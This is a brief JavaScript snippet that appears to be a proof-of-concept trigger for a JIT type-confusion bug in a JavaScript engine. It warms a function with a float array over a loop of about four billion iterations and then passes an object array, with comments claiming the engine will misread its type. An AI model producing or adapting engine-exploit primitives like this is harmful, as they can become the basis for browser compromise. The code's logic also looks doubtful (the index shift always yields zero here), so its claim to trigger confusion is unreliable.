function foo(l) {
    let x = l.length;
    return l[(x >> 16)];
}
let obj = [{X: 1}];
console.log(foo(obj));
let bar = [3.3, 4.4];
for (let i = 0; i < 0x100000000; i++) {
    foo(bar); // trigger type confusion
}
// now foo's input is considered as a float array
console.log(foo(obj));